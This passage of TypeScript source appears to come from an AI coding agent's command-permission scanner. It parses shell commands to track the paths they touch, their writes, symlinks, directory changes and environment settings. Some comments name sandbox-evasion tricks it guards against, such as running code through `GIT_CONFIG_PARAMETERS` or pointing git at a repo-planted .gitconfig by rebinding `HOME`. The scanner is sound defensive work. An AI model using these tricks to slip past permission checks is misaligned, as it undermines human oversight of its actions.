            for (const part of passed) await check(part, state.cwd, false, 'windows');
            if (passed.length > 0) continue;
          }
          const value = arg.includes('=') ? arg.slice(arg.indexOf('=') + 1) : arg;
          if (value.startsWith('-')) continue;
          const reach = reachAt(index);
          // An expansion is an unread path where a path is expected: an option's folder or file, a tree
          // operand, or a word with a separator outside the expansion (`"$X"/f`, but not `"$PAT"`).
          const option = PATH_OPTION_VALUE.test(wordValue(arg)) || PATH_OPTIONS.has(wordValue(rest[index - 1] ?? ''));
          const pattern = patterns.has(index - wrapperWordCount);
          const words = operandWords(value, scope());
          if (words === null) {
            if (option || reach || (!pattern && value.includes('/'))) unreadOperands++;
            continue;
          }
          for (const word of words) {
            const pathLike = option || reach !== null || (!pattern && /[\\/]/.test(word.text));
            await checkArgument(word, reach, pathLike);
          }
        }
      } else {
        const probe = READ_PROBES.has(program) && containedCommand(tokens);
        for (const [index, arg] of rest.entries()) {
          if (arg.startsWith('-') || (program === 'chmod' && arg.startsWith('+'))) continue;
          await check(arg, state.cwd, probe, 'program', reachAt(index));
        }
      }
      if (trees.cwd) await checkArgument(literalWord('.'), trees.cwd, true);
      if (UNPACKS.has(name)) {
        for (const tree of inPlace.trees) {
          for (const word of operandWords(tree, scope()) ?? []) await checkArgument(word, 'write', true);
        }
      }
      if (name === 'ln') await noteLinks(wrappedRest);
      if (unreadOperands > unreadBefore) Object.assign(entry, { coverable: false, words: original });
    };

    /**
     * Records an argument of a program outside TOUCHES_FILES as a path it names, without offering its folder
     * as a grant. An expansion that is not `pathLike` is taken for no path at all (`git commit -m "$(cat msg)"`).
     */
    const checkArgument = async (word: OperandWord, reach: Reach | null, pathLike: boolean): Promise<void> => {
      if (word.text === '') return;
      const rules = operandRules(state.cwd);
      const operand = readOperand(word, rules.dirname);
      if (operand.unread) {
        if (!pathLike) return;
        unreadOperands++;
      }
      const { shape, folder: prefix } = shapeOf(word, operand, rules, sep === '\\');
      if (underCreatedLink(state.cwd, prefix, 'program')) unreadOperands++;
      const record = async (physical: string): Promise<void> => {
        paths.add(physical);
        if (operand.start !== null) await reachFolder(physical, shape?.dotless === true, reach);
        else if (reach) await reachFolder(physical, false, reach);
        if (shape?.namesSettings) paths.add(join(physical, '.claude'));
      };
      const targets = operandTargets(state.cwd, prefix);
      const unreachable = targets.filter(target => inUngrantedDistro(target, allowed));
      for (const target of unreachable) ungranted.add(target);
      const here = wslLocation(state.cwd);
      if (!here) {
        if (unreachable.length === 0) {
          const volume = [parse(targets[0] ?? prefix).root];
          await record(await resolveWithinRootsPhysically(prefix, volume, state.cwd));
          const own = operand.start === null ? await ownPlaces(prefix, state.cwd, volume) : [];
          for (const place of own) paths.add(place);
        }
        return;
      }
      // A WSL folder's command reads its operands against its own distro. A Windows path or a granted other
      // distro is not on that filesystem and is left unread; one that is and fails fails the scan.
      const distro = [wslUncPath(here, '/')];
      for (const { lexical, physical, inside } of await operandPlaces(prefix, distro, state.cwd)) {
        if (wslLocation(lexical)?.distro.toLowerCase() !== here.distro.toLowerCase()) continue;
        if (!inside || physical === null) throw new PathAccessDenied(prefix);
        await record(physical);
      }
      if (operand.start === null) for (const place of await ownPlaces(prefix, state.cwd, distro)) paths.add(place);
    };

    /**
     * `ln -s TARGET LINK`: the target is read where the link will sit, and later operands under the link
     * leave the command unread, as the scan cannot follow a link that does not exist yet.
     */
    const noteLinks = async (args: readonly string[]): Promise<void> => {
      const flags = shortFlags(args);
      if (!flags.includes('s') && !args.some(arg => unquote(arg) === '--symbolic')) return;
      let directory: string | null = null;
      const operands: string[] = [];
      for (let index = 0; index < args.length; index++) {
        const arg = unquote(args[index] as string);
        if (arg === '-t' || arg === '-S') {
          if (arg === '-t') directory = args[index + 1] ?? null;
          index++;
        } else if (arg.startsWith('--target-directory=')) {
          directory = args[index].slice(args[index].indexOf('=') + 1);
        } else if (!arg.startsWith('-')) {
          operands.push(args[index] as string);
        }
      }
      const single = directory === null && operands.length === 1;
      const sources = directory !== null || single ? operands : operands.slice(0, -1);
      const place = directory ?? (single ? '.' : operands.at(-1));
      if (place === undefined) return;
      const text = (raw: string): string | null => {
        const [word] = operandWords(raw, scope()) ?? [];
        return word && word.expandAt === null ? word.text : null;
      };
      const at = text(place);
      if (at === null) return;
      const location = operandTargets(state.cwd, at)[0];
      if (location === undefined) return;
      const rules = operandRules(state.cwd);
      // `ln -s a b` makes `b`, or `b/a` when `b` is a folder; `-t` and a lone target make `<folder>/a`.
      const named = directory === null && !single;
      const inside = sources.flatMap(source => {
        const name = text(source);
        return name === null ? [] : [join(location, rules.basename(name))];
      });
      for (const source of sources) {
        await check(source, location);
        if (named) await check(source, dirname(location));
      }
      for (const link of named ? [location, ...inside] : inside) createdLinks.add(guardForm(link));
    };

    /** True when a glob or an expansion leaves the folder it moves to unknown. */
    const changeDirectory = async (program: string, rest: string[]): Promise<boolean> => {
      if (program === 'popd') {
        const back = state.stack.pop();
        if (back) {
          state.previous = state.cwd;
          state.cwd = back;
        }
        return false;
      }
      const target = rest.find(arg => arg === '-' || !arg.startsWith('-'));
      const words = target === undefined || target === '-' ? [] : operandWords(target, scope());
      const unread = unreadOperands;
      const next = target === '-' ? state.previous : await check(target ?? '~', state.cwd, false, 'shell');
      const unknown =
        words === null ||
        words.length > 1 ||
        unreadOperands > unread ||
        words.some(word => readOperand(word, operandRules(state.cwd).dirname).start !== null);
      if (next === null) return unknown;
      if (program === 'pushd') state.stack.push(state.cwd);
      state.previous = state.cwd;
      state.cwd = next;
      return unknown;
    };

    // Every reading is kept: a write recorded at a place the command never wrote only asks more often.
    const noteWrite = (raw: string, into = writes): void => {
      const text = expand(unquote(raw));
      if (!text || isDynamic(text) || HARMLESS_REDIRECT_TARGETS.has(text)) return;
      for (const target of operandTargets(state.cwd, text)) into.add(target);
    };

    const noteWrites = (program: string, rest: string[]): void => {
      const rules = operandRules(state.cwd);
      const operands = rest.filter(arg => !arg.startsWith('-'));
      if (program === 'tee') for (const operand of operands) noteWrite(operand);
      for (const [index, arg] of rest.entries()) {
        const output = DOWNLOAD_OUTPUT.get(program);
        const value = !output
          ? undefined
          : arg === output.long
            ? ''
            : arg.startsWith(`${output.long}=`)
              ? arg.slice(output.long.length + 1)
              : output.short.exec(arg)?.[1];
        if (value !== undefined) noteWrite(value || (rest[index + 1] ?? ''));
        if (program === 'dd' && arg.startsWith('of=')) noteWrite(arg.slice(3));
      }
      const [sub, verb, ...after] = commandTokens([program, ...rest]).slice(1);
      const setsConfig = [verb, ...after].filter(arg => arg && !arg.startsWith('-')).length >= 2;
      if (
        program === 'git' &&
        sub === 'config' &&
        (setsConfig || [verb, ...after].some(a => GIT_CONFIG_SETS.test(a ?? '')))
      ) {
        const repository = directoryOptionValues([program, ...rest])[0] ?? '.';
        noteWrite(rest.includes('--global') ? '~/.gitconfig' : rules.join(repository, '.git/config'));
      }
      if ((program === 'npm' || program === 'pnpm') && sub === 'pkg' && verb !== 'get') noteWrite('package.json');
      if (!COPIES.has(program)) return;
      const option = rest.findIndex(arg => arg === '-t' || arg.startsWith('--target-directory='));
      const target = option === -1 ? operands.at(-1) : (rest[option].split('=')[1] ?? rest[option + 1]);
      if (target === undefined) return;
      noteWrite(target);
      for (const source of operands) {
        if (source !== target) noteWrite(rules.join(unquote(target), rules.basename(unquote(source))));
      }
      const recursive =
        program === 'rsync' ||
        ((program === 'cp' || program === 'scp') &&
          rest.some(arg => /^-[a-zA-Z]*[rRa]/.test(arg) || arg === '--recursive' || arg === '--archive'));
      if (recursive) noteWrite(target, writtenTrees);
    };

    const redirect = async (node: Node): Promise<void> => {
      const target = node.childForFieldName('destination');
      if (!target || target.type === 'number') return;
      const text = unquote(target.text);
      if (HARMLESS_REDIRECT_TARGETS.has(text) || text.startsWith('&')) return;
      if (!WRITE_OPERATORS.has(redirectOperator(node) ?? '')) noteEnvFile(target.text);
      else noteWrite(target.text);
      await check(target.text, state.cwd);
    };

    const visit = async (node: Node): Promise<void> => {
      if (node.type === 'command') return run(node);
      // `export X=..`, `declare -x X=..` and a statement-level `X=..` set the environment every
      // later command inherits - `GIT_CONFIG_PARAMETERS` runs code through a plain `git status` -
      // so a script holding one is never covered by a remembered pattern.
      if (
        node.type === 'declaration_command' ||
        node.type === 'variable_assignments' ||
        (node.type === 'variable_assignment' && !ASSIGNMENT_OWNERS.has(node.parent?.type ?? ''))
      ) {
        commands.push({ text: node.text, always: node.text, coverable: false, words: node.text });
        contained = false;
        setsEnvironment = true;
        for (const child of node.children) if (child) await visit(child);
        return;
      }
      // `select` parses as a for_statement too; its header rebinds a variable that may be
      // exported, as `for HOME in .` points git at a repo-planted .gitconfig.
      if (node.type === 'for_statement') {
        const body = node.childForFieldName('body');
        const header = body ? node.text.slice(0, body.startIndex - node.startIndex).replace(/[\s;]+$/, '') : node.text;
        commands.push({ text: header, always: header, coverable: false, words: header });
        // A lowercase name with no underscore is no variable a listed program reads (`HOME`,
        // `GIT_DIR` and `http_proxy` all fail it), so the loop stays contained if its body does.
        if (!/^[a-z][a-z0-9]*$/.test(node.childForFieldName('variable')?.text ?? '')) contained = false;
        setsEnvironment = true;
        for (const child of node.children) if (child) await visit(child);
        return;
      }
      if (node.type === 'redirected_statement' && hasWriteRedirect(node)) {
        const body = node.childForFieldName('body');
        if (body?.type === 'command') {
          writtenCommands.add(body.id);
        } else {
          commands.push({ text: node.text, always: node.text, coverable: false, words: node.text });
        }
      }
      if (node.type === 'redirected_statement') {
        const before = unreadOperands;
        for (const child of node.children) if (child) await visit(child);
        if (unreadOperands > before) {
          commands.push({ text: node.text, always: node.text, coverable: false, words: node.text });
        }
        return;
      }
      if (node.type === 'file_redirect') {
        for (const child of node.children) if (child && child.type !== 'file_descriptor') await visit(child);
        return redirect(node);
      }
      if (SUBSHELLS.has(node.type) || node.type === 'pipeline') {
        const saved = { cwd: state.cwd, previous: state.previous, stack: [...state.stack] };
        const isolate = SUBSHELLS.has(node.type);
        for (const child of node.children) {
          if (!child) continue;
          if (!isolate) Object.assign(state, { cwd: saved.cwd, previous: saved.previous, stack: [...saved.stack] });
          await visit(child);
        }
        Object.assign(state, saved);
        return;
      }
      for (const child of node.children) if (child) await visit(child);
    };

    await visit(tree.rootNode);
    if (homeGuessed) return null;
    return {
      commands,
      paths: [...paths],
      ...(globFolders.size > 0 ? { globFolders: [...globFolders] } : {}),
      ...(dotlessGlobFolders.size > 0 ? { dotlessGlobFolders: [...dotlessGlobFolders] } : {}),
      directories: [...directories],
      ungranted: [...ungranted],
      envFiles: [...envFiles],
      outbound: [...outbound],
      sends: setsEnvironment ? sends.map(({ reason }) => ({ reason, target: null })) : sends,
      contained: contained && commands.length > 0,
      readOnly: readOnly && !setsEnvironment && commands.length > 0,
      writes: [...writes],
      writtenTrees: [...writtenTrees],
    };
  } finally {
    tree.delete();
  }
}
